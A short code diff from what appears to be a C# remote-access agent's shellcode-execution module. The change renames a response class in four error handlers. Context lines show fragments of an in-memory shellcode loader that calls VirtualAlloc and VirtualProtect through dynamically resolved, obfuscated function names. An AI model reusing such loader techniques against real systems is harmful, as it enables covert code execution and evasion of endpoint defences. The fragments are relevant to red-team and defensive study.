@@ -62,7 +62,7 @@ namespace Agent
 
             if (!args.Validate())
             {
-                await messageManager.AddResponse(new ResponseResult()
+                await messageManager.AddResponse(new TaskResponse()
                 {
                     completed = true,
                     user_output = "Missing Shellcode Bytes",
@@ -79,7 +79,7 @@ namespace Agent
 
             if (bufAddr == IntPtr.Zero)
             {
-                await messageManager.AddResponse(new ResponseResult()
+                await messageManager.AddResponse(new TaskResponse()
                 {
                     completed = true,
                     user_output = $"err VirtualAlloc ({Marshal.GetLastPInvokeError()})",
@@ -97,7 +97,7 @@ namespace Agent
             bool result = Generic.InvokeFunc<bool>(Resolver.GetFunc("vp"), typeof(VPDelegate), ref vpParams);
             if (!result)
             {
-                await messageManager.AddResponse(new ResponseResult()
+                await messageManager.AddResponse(new TaskResponse()
                 {
                     completed = true,
                     user_output = $"err VirtualProtect ({Marshal.GetLastPInvokeError()})",
@@ -115,7 +115,7 @@ namespace Agent
             }
             catch
             {
-                await messageManager.AddResponse(new ResponseResult()
+                await messageManager.AddResponse(new TaskResponse()
                 {
                     completed = false,
                     process_response = new Dictionary<string, string> { { "message", "0x44" } },
